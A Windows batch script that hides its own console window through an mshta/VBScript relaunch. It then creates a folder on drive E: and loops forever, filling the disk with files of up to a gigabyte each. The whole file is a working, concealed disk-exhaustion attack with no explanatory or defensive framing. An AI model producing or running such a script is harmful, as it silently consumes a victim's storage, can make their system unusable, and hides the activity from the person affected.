@echo off
if "%1"=="hide" goto CmdBegin
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:CmdBegin

set /a i = 0
e:
mkdir vavjhv
cd /vavjhv

:while
set /a i+=1
fsutil file createnew dhagfwabfvb%i% 1000000000
fsutil file createnew dhaggeaggbbfvb%i% 1000000
fsutil file createnew dhaggeagfwafgbbfvb%i% 1000
fsutil file createnew dhahtseherfvb%i% 1
goto :while